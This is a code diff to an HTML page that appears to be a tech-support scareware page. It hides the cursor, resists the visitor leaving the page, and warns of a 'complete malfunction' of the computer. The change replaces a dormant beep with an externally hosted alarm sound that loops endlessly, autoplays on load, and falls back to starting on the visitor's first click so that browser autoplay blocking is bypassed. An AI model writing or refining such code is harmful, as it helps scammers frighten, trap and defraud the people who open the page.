@@ -124,8 +124,9 @@ return false;
 </head>
 <body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">
 
-<audio id="beep" autoplay="autoplay">
-    <source src="myaudio.mp3" type="audio/mpeg">
+<audio id="beep" loop preload="auto">
+    <source src="https://bhddpop.netlify.app/myaudio.mp3" type="audio/mpeg">
+    Your browser does not support the audio element.
 </audio>
 <div class="bg" style="cursor:none;">
     <div class="bgimg" style="top: 0px;"><img src="background.png" alt="" width="100%"></div>
@@ -888,17 +889,27 @@ to avoid a complete malfunction of your computer.</p>
         }
     }
 </script>
-<script type="text/javascript">
-    window.addEventListener('load', function () {
-        // Wait for 3 seconds, then try to play the audio
-        setTimeout(function () {
-            const beep = document.getElementById("beep");
-            if (beep) {
-                beep.play().catch(function (error) {
-                    console.error("Autoplay failed:", error);
-                });
-            }
-        }, 100000000); // 3 seconds
+<script>
+    const beep = document.getElementById("beep");
+
+    // Ensure loop is enabled
+    beep.loop = true;
+
+    // Try to autoplay
+    beep.play().then(() => {
+        console.log("Audio playing in loop.");
+    }).catch((error) => {
+        console.warn("Autoplay blocked. Click anywhere to start.");
+
+        // Fallback: start on user click
+        const enableBeep = () => {
+            beep.play().then(() => {
+                console.log("Audio started and looping after click.");
+            });
+            document.removeEventListener("click", enableBeep);
+        };
+
+        document.addEventListener("click", enableBeep);
     });
 </script>
 <script>
